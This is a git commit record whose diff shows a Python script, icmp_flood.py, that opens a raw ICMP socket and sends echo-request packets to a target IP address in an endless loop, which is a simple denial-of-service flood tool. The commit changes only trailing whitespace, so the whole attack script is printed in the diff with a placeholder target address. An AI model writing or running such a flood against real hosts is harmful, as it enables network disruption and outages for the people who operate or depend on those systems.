340dbdf0e0405e0a287e9ea3b89dc2e2c50ea9b2
jasser cherif <147918952+jassercherif@users.noreply.github.com>
2024-08-29 11:31:44 +0100

    Update icmp_flood.py

--- icmp_flood.py
+++ icmp_flood.py
@@ -3,19 +3,19 @@ import random
 import socket
 import struct
 
-def icmp_flood(target_ip):
-    icmp = socket.getprotobyname("icmp")
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
-    
-    packet_id = random.randint(0, 65535)
+def icmp_flood(target_ip): 
+    icmp = socket.getprotobyname("icmp") 
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp) 
      
+    packet_id = random.randint(0, 65535) 
+      
     while True:
-        packet = struct.pack("BBHHH", 8, 0, 0, packet_id, 1)
+        packet = struct.pack("BBHHH", 8, 0, 0, packet_id, 1) 
         s.sendto(packet, (target_ip, 0))
-        packet_id = (packet_id + 1) & 0xFFFF
+        packet_id = (packet_id + 1) & 0xFFFF 
 
 if __name__ == '__main__':
-    target_ip = "192.168.1.100"    # Replace with the target's IP address
+    target_ip = "192.168.1.100"    # Replace with the target's IP address 
      
     icmp_flood(target_ip)
 
